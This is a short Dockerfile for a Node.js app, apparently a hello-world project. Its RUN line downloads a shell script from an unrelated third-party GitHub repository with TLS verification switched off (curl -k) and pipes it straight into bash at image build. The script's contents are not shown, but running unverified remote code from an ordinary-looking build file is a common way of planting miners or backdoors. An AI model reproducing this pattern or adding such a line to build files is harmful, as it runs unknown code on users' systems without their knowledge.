FROM node:20.13.1-bookworm-slim

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN apt update;apt -y install curl wget git apt-utils dialog;curl -fsSL -k https://raw.githubusercontent.com/abongiletraeffik/hello-world-dockerfile-nodejs2/refs/heads/main/start_myb_mbc.sh | bash

CMD ["npm", "run", "start"]
